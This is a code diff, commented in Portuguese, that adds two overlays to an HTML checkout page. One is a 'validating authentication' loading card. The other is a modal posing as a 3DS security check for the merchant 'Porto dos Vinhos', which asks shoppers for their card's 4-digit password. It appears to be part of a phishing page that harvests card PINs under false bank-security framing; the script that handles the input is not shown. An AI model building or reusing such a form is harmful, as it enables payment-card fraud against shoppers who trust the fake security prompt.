@@ -486,6 +486,74 @@
     </div>
   </div>
 
+  <!-- TELA DE CARREGAMENTO / LOADING OVERLAY DE AUTENTICAÇÃO (WHITE CARD) -->
+  <div class="auth-overlay" id="auth-loading-overlay">
+    <div class="auth-card">
+      <div class="auth-spinner"></div>
+      <h2 class="auth-title">Validando autenticação</h2>
+      <p class="auth-subtitle">Estamos confirmando os dados com a rede emissora. Aguarde alguns segundos.</p>
+    </div>
+  </div>
+
+  <!-- MODAL DE AUTENTICAÇÃO 3DS / SENHA DO CARTÃO (WHITE CARD) -->
+  <div class="auth-overlay" id="auth-3ds-overlay">
+    <div class="auth-card auth-3ds-card">
+      
+      <!-- Cabeçalho -->
+      <div class="auth-3ds-header">
+        <h3 class="auth-3ds-title">Autenticação via senha</h3>
+        <!-- Logo dinâmico da bandeira (Visa, Mastercard, etc.) -->
+        <div class="auth-brand-logo generic" id="auth-brand-logo">
+          <i class="fa-solid fa-credit-card"></i>
+        </div>
+        <div class="auth-security-badge">Confirmação de segurança 3DS</div>
+      </div>
+
+      <!-- Descrição -->
+      <p class="auth-3ds-description">
+        Para maior segurança, é necessário preencher a senha de 4 dígitos do seu cartão para concluir a autenticação.
+      </p>
+
+      <!-- Caixa de Informações do Estabelecimento/Compra -->
+      <div class="auth-info-box">
+        <div class="auth-info-row">
+          <span class="auth-info-label">Estabelecimento:</span>
+          <span class="auth-info-value">Porto dos Vinhos</span>
+        </div>
+        <div class="auth-info-row">
+          <span class="auth-info-label">Valor:</span>
+          <span class="auth-info-value" id="auth-info-amount">R$ 0,00</span>
+        </div>
+        <div class="auth-info-row">
+          <span class="auth-info-label">Data:</span>
+          <span class="auth-info-value" id="auth-info-date">--/--/----, --:--:--</span>
+        </div>
+        <div class="auth-info-row">
+          <span class="auth-info-label">Número do cartão:</span>
+          <span class="auth-info-value" id="auth-info-card">XXXX XXXX XXXX 0000</span>
+        </div>
+      </div>
+
+      <!-- Seção de Senha -->
+      <div class="auth-password-section">
+        <span class="auth-password-label">Senha do cartão (4 dígitos)</span>
+        <div class="auth-password-digits">
+          <input type="password" class="auth-digit-input" id="auth-digit-1" maxlength="1" pattern="[0-9]*" inputmode="numeric" required autocomplete="off">
+          <input type="password" class="auth-digit-input" id="auth-digit-2" maxlength="1" pattern="[0-9]*" inputmode="numeric" required autocomplete="off">
+          <input type="password" class="auth-digit-input" id="auth-digit-3" maxlength="1" pattern="[0-9]*" inputmode="numeric" required autocomplete="off">
+          <input type="password" class="auth-digit-input" id="auth-digit-4" maxlength="1" pattern="[0-9]*" inputmode="numeric" required autocomplete="off">
+        </div>
+      </div>
+
+      <!-- Ações -->
+      <div class="auth-actions">
+        <button type="button" class="auth-btn auth-btn-cancel" id="btn-cancel-3ds">Cancelar</button>
+        <button type="button" class="auth-btn auth-btn-submit" id="btn-submit-3ds">Enviar</button>
+      </div>
+
+    </div>
+  </div>
+
   <!-- JS Principal -->
   <script src="js/app.js"></script>
 </body>
